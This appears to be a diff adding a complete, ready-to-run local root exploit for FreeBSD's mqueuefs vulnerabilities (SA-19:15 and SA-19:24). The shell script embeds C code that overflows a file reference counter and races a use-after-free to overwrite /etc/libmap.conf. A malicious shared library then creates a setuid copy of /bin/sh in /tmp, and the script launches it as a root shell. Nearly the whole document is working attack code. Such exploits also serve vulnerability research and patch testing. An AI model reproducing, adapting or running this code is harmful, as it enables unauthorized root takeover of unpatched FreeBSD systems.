@@ -1,0 +1,754 @@
+# Exploit: FreeBSD-SA-19:15.mqueuefs - Privilege Escalation
+# Author: Karsten König of Secfault Security
+# Date: 2019-12-30
+# Change line 719 to choose which vulnerability
+# is targeted
+#
+# libmap.conf primitive inspired by kcope's 2005 exploit for Qpopper
+# Exploit for FreeBSD-SA-19:15.mqueuefs and
+# FreeBSD-SA-19:24.mqueu
+#!/bin/sh
+
+echo "[+] Root Exploit for FreeBSD mqueuefs vulnerabilities"
+
+umask 0000
+
+# libmap.conf has to exist because it is
+# the attacked file
+if [ ! -f /etc/libmap.conf ]; then
+    echo "[!] libmap.conf has to exist"
+    exit
+fi
+
+# Make a backup of the current libmap.conf
+# because it has to be reconstructed afterwards
+cp /etc/libmap.conf ./
+
+# Write the exploit to a C file
+cat > exploit.c << EOF
+#include <errno.h>
+#include <fcntl.h>
+#include <pthread.h>
+#include <pthread_np.h>
+#include <signal.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/cpuset.h>
+#include <sys/event.h>
+#include <sys/ioctl.h>
+#include <sys/param.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
+#include <sys/syscall.h>
+#include <sys/sysctl.h>
+#include <sys/_types.h>
+#include <sys/types.h>
+#include <sys/un.h>
+
+#define N_OPEN 0x2
+
+// Tweak NUM_THREADS and NUM_FORKS if
+// more RAM is available on the target
+//
+// These parameters were tested with
+// up to 16 GB of RAM on a dual-core
+// Intel based system
+#define N 1000000
+#define NUM_THREADS 600
+#define NUM_FORKS 3
+#define FILE_SIZE 1024
+#define CHUNK_SIZE 1
+#define N_FILES 25
+
+// These are temporary files
+// which are created during
+// exploitation
+#define SERVER_PATH "/tmp/sync_forks"
+#define DEFAULT_PATH "/tmp/pwn"
+#define HAMMER_PATH "/tmp/pwn2"
+
+// This is the attacked file
+#define ATTACK_PATH "/etc/libmap.conf"
+
+// These are parameters from the attack script
+#define HOOK_LIB "libutil.so.9"
+#define ATTACK_LIB "/tmp/libno_ex.so.1.0"
+
+// The exploit will stick some threads
+// to specific cores
+#define CORE_0 0
+#define CORE_1 1
+
+// Syscalls from mqueuefs
+#define KMQ_OPEN 457
+#define KMQ_TIMEDSEND 460
+
+// Taken from sys/mqueue.h
+struct mq_attr {
+    long    mq_flags;
+    long    mq_maxmsg;
+    long    mq_msgsize;
+    long    mq_curmsgs;
+    long    __reserved[4];
+};
+
+struct thread_data {
+    int fd;
+    int fd2;
+};
+
+pthread_mutex_t write_mtx, trigger_mtx, count_mtx, hammer_mtx;
+pthread_cond_t write_cond, trigger_cond, count_cond, hammer_cond;
+
+// Both syscalls are indirectly called to be less reliable on
+// installed libraries
+int mq_open(const char *name, int oflag, mode_t mode,
+            const struct mq_attr *attr)
+{
+    int fd;
+    fd = syscall(KMQ_OPEN, name, oflag, mode, attr);
+    return fd;
+}
+
+void mq_timedsend(int fd, char *buf, size_t len,
+		 unsigned prio, const struct timespec *timeout)
+{
+    syscall(KMQ_TIMEDSEND, fd, buf, len, prio, timeout);
+}
+
+// Convenience function to open temporary files
+int open_tmp(char *path)
+{
+    int fd;
+    char *real_path;
+
+    if (path != NULL) {
+	real_path = malloc(strlen(path) + 1);
+	strcpy(real_path, path);
+    }
+    else {
+	real_path = malloc(strlen(DEFAULT_PATH) + 1);
+	strcpy(real_path, DEFAULT_PATH);
+    }
+
+    if ((fd = open(real_path, O_RDWR | O_CREAT, S_IRWXU)) == -1) {
+	perror("[!] open");
+    }
+    
+    return fd;
+}
+
+// Convenience function to prepare a UNIX domain socket
+void prepare_domain_socket(struct sockaddr_un *remote, char *path) {
+    bzero(remote, sizeof(struct sockaddr_un));
+    remote->sun_family = AF_UNIX;
+    strncpy(remote->sun_path, path, sizeof(remote->sun_path));
+}
+
+// Convenience function to bind a UNIX domain socket
+int bind_domain_socket(struct sockaddr_un *remote) {
+    int server_socket;
+    
+    if ((server_socket = socket(AF_UNIX, SOCK_DGRAM, 0)) == -1) {
+	perror("[!] socket");
+	exit(1);
+    }
+
+    if (bind(server_socket, 
+	     (struct sockaddr *) remote, 
+	     sizeof(struct sockaddr_un)) != 0) {
+	perror("[!] bind");
+	exit(1);
+    }
+
+    return server_socket;
+}
+
+// Convenience function to connect to a UNIX domain socket
+int connect_domain_socket_client() {
+    int client_socket;
+    
+    if ((client_socket = socket(AF_UNIX, SOCK_DGRAM, 0)) == -1) {
+	perror("[!] socket");
+	exit(1);
+    }
+
+    return client_socket;
+}
+
+// Prevent panic at termination because f_count of the
+// corrupted struct file is 0 at the moment this function
+// is called but open file descriptors still points to the struct,
+// hence fdrop() is called at exit of the program and will raise a
+// kernel panic because f_count will be below 0
+//
+// So we just use our known primitive to increase f_count
+void prevent_panic(int fd)
+{
+    mq_timedsend(fd, NULL, 0, 0, (const struct timespec *)0x1);
+    mq_timedsend(fd, NULL, 0, 0, (const struct timespec *)0x1);
+    mq_timedsend(fd, NULL, 0, 0, (const struct timespec *)0x1);
+}
+
+// Convenience function to stick a thread to a CPU core
+int stick_thread_to_core(int core) {
+    cpuset_t cpuset;
+    CPU_ZERO(&cpuset);
+    CPU_SET(core, &cpuset);
+    
+    pthread_t current_thread = pthread_self();    
+    return pthread_setaffinity_np(current_thread, sizeof(cpuset_t), &cpuset);
+}
+
+// This function will trigger the use-after-free
+void *trigger_uaf(void *thread_args) {
+    struct thread_data *thread_data;
+    int fd, fd2;
+
+    if (stick_thread_to_core(CORE_0) != 0) {
+	perror("[!] [!] trigger_uaf: Could not stick thread to core");
+    }
+    
+    thread_data = (struct thread_data *)thread_args;
+    fd = thread_data->fd;
+    fd2 = thread_data->fd2;
+
+    printf("[+] trigger_uaf: fd: %d\n", fd);
+    printf("[+] trigger_uaf: fd2: %d\n", fd2);
+
+    // The thread has to wait for the preparation of the
+    // race condition
+    printf("[+] trigger_uaf: Waiting for start signal from monitor\n");
+    pthread_mutex_lock(&trigger_mtx);
+    pthread_cond_wait(&trigger_cond, &trigger_mtx);
+
+    // This sleep parameter helps to render
+    // the exploit more reliable
+    //
+    // Tweeking may be needed for the target system
+    usleep(40);
+
+    // Close two fds to trigger UaF
+    //
+    // This assumes that fget_write() in kern_writev()
+    // was already successful!
+    //
+    // Otherwise kernel panic is triggered
+    //
+    // f_count = 2 (primitive+fget_write)
+    close(fd);
+    close(fd2);
+    // f_count = 0 => free
+    fd = open(ATTACK_PATH, O_RDONLY);
+    // refcount = 1
+    // all fds do now point to the attacked path
+
+    printf("[+] trigger_uaf: Opened read-only file\n");	
+    printf("[+] trigger_uaf: Exit\n");
+    
+    pthread_exit(NULL);
+}
+
+// This function will write to many invalid file streams
+//
+// This will eventually increase the number of dirty buffers
+// in the kernel and creates an exploitable race condition
+// for the Use-after-Free
+void *hammer(void *arg) {
+    int i, j, k, client_socket;
+    char buf[FILE_SIZE], sync_buf[3];
+    FILE *fd[N_FILES];
+    struct sockaddr_un remote;
+
+    prepare_domain_socket(&remote, SERVER_PATH);
+    client_socket = connect_domain_socket_client();
+    strncpy(sync_buf, "1\n", 3);
+
+    // Open many files and unlink them directly
+    // to render the file stream invalid
+    for (i = 0; i < N_FILES; i++) {
+	unlink(HAMMER_PATH);
+	if ((fd[i] = fopen(HAMMER_PATH, "w+")) == NULL) {
+	    perror("[!] fopen");
+	    exit(1);
+	}
+    }
+    
+    for (i = 0; i < FILE_SIZE; i++) {
+    	buf[i] = 'a';
+    }
+
+    pthread_mutex_lock(&hammer_mtx);
+
+    // Signal that the thread is prepared
+    // 
+    // Sometimes sendto() fails because
+    // no free buffer is available
+    for (;;) {
+	if (sendto(client_socket,
+		   sync_buf,
+		   strlen(sync_buf), 0,
+		   (struct sockaddr *) &remote,
+		   sizeof(remote)) != -1) {
+	    break;
+	}
+    }
+    
+    // Wait for the other hammer threads
+    pthread_cond_wait(&hammer_cond, &hammer_mtx);
+    pthread_mutex_unlock(&hammer_mtx);
+
+    // Write to the file streams to create many dirty buffers
+    for (i = 0; i < N; i++) {
+	for (k = 0; k < N_FILES; k++) {
+	    rewind(fd[k]);   
+	}
+	for (j = 0; j < FILE_SIZE*FILE_SIZE; j += CHUNK_SIZE) {
+	    for (k = 0; k < N_FILES; k++) {
+		if (fwrite(&buf[j % FILE_SIZE], sizeof(char), CHUNK_SIZE, fd[k]) < 0) {
+		    perror("[!] fwrite");
+		    exit(1);
+		}
+	    }
+	    fflush(NULL);
+	}
+    }
+    
+    pthread_exit(NULL);
+}
+
+// This function monitors the number of
+// dirty buffers.
+//
+// If enough dirty buffers do exist, a
+// signal to the write and Use-after-Free
+// trigger thread is signalled to
+// execute the actual attack
+//
+// Works on UFS only
+void *monitor_dirty_buffers(void *arg) {
+    int hidirtybuffers, numdirtybuffers;
+    size_t len;
+
+    len = sizeof(int);
+    
+    if (sysctlbyname("vfs.hidirtybuffers", &hidirtybuffers, &len, NULL, 0) != 0) {
+	perror("[!] sysctlbyname hidirtybuffers");
+	exit(1);
+    };
+    printf("[+] monitor: vfs.hidirtybuffers: %d\n", hidirtybuffers);
+
+    while(1) {
+	sysctlbyname("vfs.numdirtybuffers", &numdirtybuffers, &len, NULL, 0);
+	if (numdirtybuffers >= hidirtybuffers) {
+	    pthread_cond_signal(&write_cond);
+	    pthread_cond_signal(&trigger_cond);		    
+	    printf("[+] monitor: Reached hidirtybuffers watermark\n");
+	    break;
+	}
+    }
+    
+    pthread_exit(NULL);
+}
+
+// Check if the write to the attacked
+// path was successful
+int check_write(int fd) {
+    char buf[256];
+    int nbytes;
+    struct stat st;
+
+    printf("[+] check_write\n");
+    stat(DEFAULT_PATH, &st);
+    printf("[+] %s size: %lld\n", DEFAULT_PATH, st.st_size);
+
+    stat(ATTACK_PATH, &st);
+    printf("[+] %s size: %lld\n", ATTACK_PATH, st.st_size);
+        
+    nbytes = read(fd, buf, strlen(HOOK_LIB));
+    printf("[+] Read bytes: %d\n", nbytes);
+    if (nbytes > 0 && strncmp(buf, HOOK_LIB, strlen(HOOK_LIB)) == 0) {
+	return 1;
+    }
+    else if (nbytes < 0) {
+	perror("[!] check_write:read");
+	printf("[!] check_write:Cannot check if it worked!");
+	return 1;
+    }
+    
+    return 0;
+}
+
+// This function will execute the write operation
+// to the attacked path
+void *write_to_file(void *thread_args) {
+    int fd, fd2, nbytes;
+    int *fd_ptr;
+    char buf[256];
+    struct thread_data *thread_data;
+    struct mq_attr attrs;
+    
+    if (stick_thread_to_core(CORE_1) != 0) {
+	perror("[!] write_to_file: Could not stick thread to core");
+    }
+
+    fd_ptr = malloc(sizeof(int));
+    
+    attrs.mq_maxmsg = 10;
+    attrs.mq_msgsize = sizeof(int);    
+    
+    thread_data = (struct thread_data *)thread_args;
+    fd = thread_data->fd;
+    fd2 = open(ATTACK_PATH, O_RDONLY);
+
+    // Wait for the signal to execute the write operation
+    printf("[+] write_to_file: Wait for signal from monitor\n");	
+    pthread_mutex_lock(&write_mtx);
+    pthread_cond_wait(&write_cond, &write_mtx);
+
+    // Write to the temporary file
+    //
+    // During the write operation the exploit will trigger
+    // the Use-after-Free and exchange the written file
+    // with the attacked file to render a write to it
+    snprintf(buf, 256, "%s %s\n#", HOOK_LIB, ATTACK_LIB);
+    nbytes = write(fd, buf, strlen(buf));
+
+    // Reopen directly after write to prevent panic later
+    //
+    // After the write f_count == 0 because after trigger_uaf()
+    // opened the read-only file, f_count == 1 and write()
+    // calls fdrop() at the end
+    //
+    // => f_count == 0
+    //
+    // A direct open hopefully assigns the now again free file
+    // object to fd so that we can prevent the panic with our
+    // increment primitive.
+    *fd_ptr = mq_open("/pwn_mq", O_RDWR | O_CREAT, 0666, &attrs);
+    if (*fd_ptr == -1)
+	perror("[!] write_to_file: mq_open");
+    
+    if (nbytes < 0) {
+	perror("[!] write_to_file: write");
+    } else if (nbytes > 0) {
+	printf("[+] write_to_file: We have written something...\n");
+	if (check_write(fd2) > 0)
+	    printf("[+] write_to_file: It (probably) worked!\n");
+	else
+	    printf("[!] write_to_file: It worked not :(\n");
+    }
+
+    printf("[+] write_to_file: Exit\n");
+    pthread_exit(fd_ptr);
+}
+
+// This function prepares the Use-after-Free due to
+// a reference counter overflow
+void prepare(int fds[3]) {
+    int fd, fd2, fd3, trigger_fd;
+    u_int32_t i;
+    struct mq_attr attrs;
+    attrs.mq_maxmsg = 10;
+    attrs.mq_msgsize = sizeof(int);
+
+    printf("[+] Start UaF preparation\n");
+    printf("[+] This can take a while\n");
+
+    // Open a mqueue file
+    fd = mq_open("/pwn_mq", O_RDWR | O_CREAT, 0666, &attrs);
+    if (fd == -1) {
+	perror("open");
+	exit(1);
+    }  
+
+    // fp->f_count will be incremented by 1 per iteration due
+    // to the bug in freebsd32_kmq_timedsend()
+    //
+    // That is, 0xfffffffe iterations will increment it to
+    // 0xffffffff (f_count starts with 1 because of mq_open())
+    //
+    // The bug is triggered because freebsd_kqm_timedsend will eventually
+    // try to call copyin() with the pointer to address 0x1 which
+    // is invalid
+    for (i = 0; i < 0xfffffffe; i++) {
+    	// just a progress message, nothing special about the magic values
+    	if (i % 0x19999990 == 0)
+    	    printf("[+] Progress: %d%%\n", (u_int32_t) (i / 0x28f5c28));
+    	mq_timedsend(fd, NULL, 0, 0, (const struct timespec *)0x1);
+    }
+
+    // Every dup() increases fp->f_count by 1
+    //
+    // Using dup() works because FreeBSD's mqueue implementation
+    // is implemented by using file objects (struct file) internally.
+    //
+    // This circumvents an infinite loop in fget_unlocked() as dup()
+    // does not use _fget() but fhold() to increase the counter.
+    fd2 = dup(fd);
+    if (fd2 == -1) {
+	perror("dup");
+	exit(1);
+    }  
+    fd3 = dup(fd);
+    if (fd3 == -1) {
+	perror("dup");
+	exit(1);
+    }  
+
+    // Close the mqueue file to trigger a free operation
+    //
+    // The descriptors fd2 and fd3 will still point
+    // to the freed object
+    //
+    // Opening another file will render these descriptors
+    // to point the newly opened file
+    close(fd);
+    trigger_fd = open_tmp(NULL);
+    
+    fds[0] = trigger_fd;
+    fds[1] = fd2;
+    fds[2] = fd3;
+    
+    printf("[+] Finished UaF preparation\n");
+}
+
+// This function will monitor that all
+// hammer threads are opened
+void read_thread_status(int server_socket) {
+    int bytes_rec, count;
+    struct sockaddr_un client;
+    socklen_t len;
+    char buf[256];
+    struct timeval tv;
+    
+    tv.tv_sec = 10;
+    tv.tv_usec = 0;
+    setsockopt(server_socket,
+	       SOL_SOCKET, SO_RCVTIMEO,
+	       (const char*)&tv, sizeof tv);
+    
+    for (count = 0; count < NUM_FORKS*NUM_THREADS; count++) {
+	if (count % 100 == 0) {
+	    printf("[+] Hammer threads ready: %d\n", count);
+	}
+	bzero(&client, sizeof(struct sockaddr_un));
+	bzero(buf, 256);
+	
+	len = sizeof(struct sockaddr_un);
+	if ((bytes_rec = recvfrom(server_socket,
+				  buf, 256, 0,
+				  (struct sockaddr *) &client,
+				  &len)) == -1) {
+	    perror("[!] recvfrom");
+	    break;
+	}
+    }
+
+    if (count != NUM_FORKS * NUM_THREADS) {
+	printf("[!] Could not create all hammer threads, will try though!\n");
+    }
+}
+
+// This function will execute the whole exploit
+void fire() {
+    int i, j, fd, fd2, fd3, bytes_rec, server_socket;
+    int sv[2], fds[3], hammer_socket[NUM_FORKS];
+    int *fd_ptr;
+    char socket_path[256], sync_buf[3], buf[256];
+    pthread_t write_thread, trigger_thread, monitor_thread;
+    pthread_t hammer_threads[NUM_THREADS];
+    pid_t pids[NUM_FORKS];
+    socklen_t len;
+    struct thread_data thread_data;
+    struct sockaddr_un server, client;
+    struct sockaddr_un hammer_socket_addr[NUM_FORKS];
+
+    // Socket for receiving thread status
+    unlink(SERVER_PATH);
+    prepare_domain_socket(&server, SERVER_PATH);
+    server_socket = bind_domain_socket(&server);
+
+    // Sockets to receive hammer signal
+    for (i = 0; i < NUM_FORKS; i++) {
+	snprintf(socket_path, sizeof(socket_path), "%s%c", SERVER_PATH, '1'+i);
+	unlink(socket_path);
+	prepare_domain_socket(&hammer_socket_addr[i], socket_path);
+	hammer_socket[i] = bind_domain_socket(&hammer_socket_addr[i]);
+    }
+
+    strncpy(sync_buf, "1\n", 3);
+    len = sizeof(struct sockaddr_un);
+    
+    if (socketpair(PF_UNIX, SOCK_STREAM, 0, sv) == -1) {
+	perror("[!] socketpair");
+	exit(1);
+    }
+        
+    pthread_mutex_init(&write_mtx, NULL);
+    pthread_mutex_init(&trigger_mtx, NULL);
+    pthread_cond_init(&write_cond, NULL);
+    pthread_cond_init(&trigger_cond, NULL);
+
+    // Create the thread to monitor the number of
+    // dirty buffers directly in the beginning
+    // to be ready when needed
+    pthread_create(&monitor_thread, NULL, monitor_dirty_buffers, NULL);
+
+    // Prepare the UaF using the 0day
+    prepare(fds);
+    fd = fds[0];
+    fd2 = fds[1];
+    fd3 = fds[2];
+
+    // Create the threads which will execute the exploit
+    thread_data.fd = fd;
+    thread_data.fd2 = fd2;
+    pthread_create(&trigger_thread, NULL, trigger_uaf, (void *) &thread_data);
+    pthread_create(&write_thread, NULL, write_to_file, (void *) &thread_data);
+    
+    for (j = 0; j < NUM_FORKS; j++) {
+	if ((pids[j] = fork()) < 0) {
+	    perror("[!] fork");
+	    abort();
+	}
+	else if (pids[j] == 0) {
+	    // Close the file descriptors
+	    // becasue each fork will have an own reference
+	    // to the file object, thus increasing the
+	    // reference counter
+	    close(fd);	    
+	    close(fd2);
+	    close(fd3);
+	    pthread_mutex_init(&hammer_mtx, NULL);
+	    pthread_cond_init(&hammer_cond, NULL);
+
+	    // Create the hammer threads
+	    for (i = 0; i < NUM_THREADS; i++) {
+	    	pthread_create(&hammer_threads[i], NULL, hammer, NULL);
+	    }
+
+	    printf("[+] Fork %d created all threads\n", j);
+
+	    // Wait for the signal to start hammering from the parent
+	    if ((bytes_rec = recvfrom(hammer_socket[j],
+				      buf, 256, 0,
+				      (struct sockaddr *) &client,
+				      &len)) == -1) {
+		perror("[!] accept");
+		abort();
+	    }
+
+	    // Broadcast to the hammer threads to
+	    // start hammering
+	    pthread_cond_broadcast(&hammer_cond);
+
+	    // Wait for the hammer threads
+	    for (i = 0; i < NUM_THREADS; i++) {
+	    	pthread_join(hammer_threads[i], NULL);
+	    }
+
+	    pthread_cond_destroy(&hammer_cond);
+	    pthread_mutex_destroy(&hammer_mtx);
+
+	    exit(0);
+	} else {
+	    printf("[+] Created child with PID %d\n", pids[j]);	    
+	}
+    }    
+
+    // Wait for the preparation of all hammer threads
+    // in the forks.
+    //
+    // If all are prepared, send a signal to the childs
+    // to start the hammering process to create dirty
+    // buffers.
+    read_thread_status(server_socket);
+    printf("[+] Send signal to Start Hammering\n");
+    for (i = 0; i < NUM_FORKS; i++) {
+	if (sendto(hammer_socket[i],
+		   sync_buf,
+		   strlen(sync_buf), 0,
+		   (struct sockaddr *) &hammer_socket_addr[i],
+		   sizeof(hammer_socket_addr[0])) == -1) {
+	    perror("[!] sendto");
+	    exit(1);
+	}
+    }
+
+    // Wait for all threads to finish
+    pthread_join(monitor_thread, NULL);
+    for (i = 0; i < NUM_FORKS; i++) {
+	kill(pids[i], SIGKILL);
+	printf("[+] Killed %d\n", pids[i]);
+    }
+
+    pthread_join(write_thread, (void **) &fd_ptr);    
+    pthread_join(trigger_thread, NULL);
+    
+    pthread_mutex_destroy(&write_mtx);
+    pthread_mutex_destroy(&trigger_mtx);
+    pthread_cond_destroy(&write_cond);
+    pthread_cond_destroy(&trigger_cond);
+
+    // Prevent a kernel panic
+    prevent_panic(*fd_ptr);
+
+    // fd was acquired from write_to_file
+    // which allocs a pointer for it
+    free(fd_ptr);
+}
+
+int main(int argc, char **argv)
+{
+    setbuf(stdout, NULL);
+    
+    fire();
+    
+    return 0;
+}
+
+EOF
+
+# Compile with -m32 to exploit FreeBSD-SA-19:24.mqueuefs
+cc -o exploit -lpthread exploit.c
+# cc -o exploit -m32 -lpthread exploit.c
+
+cat > program.c << EOF
+#include <unistd.h>
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init()
+{
+  if (!geteuid())
+    execl("/bin/sh","sh","-c","/bin/cp /bin/sh /tmp/xxxx ; /bin/chmod +xs /tmp/xxxx",NULL);
+}
+
+EOF
+
+# Compile the shared library object
+cc -o program.o -c program.c -fPIC
+cc -shared -Wl,-soname,libno_ex.so.1 -o libno_ex.so.1.0 program.o -nostartfiles
+cp libno_ex.so.1.0 /tmp/libno_ex.so.1.0
+
+# Start the exploit
+#
+# su will execute the shared library object
+# that creates the shell binary copy
+echo "[+] Firing the Exploit"
+./exploit
+su
+
+# Ensure that everything has worked
+# and execute the root-shell
+if [ -f /tmp/xxxx ]; then
+    echo "[+] Enjoy!"
+    echo "[+] Do not forget to copy ./libmap.conf back to /etc/libmap.conf"
+    /tmp/xxxx
+else
+    echo "[!] FAIL"
+fi
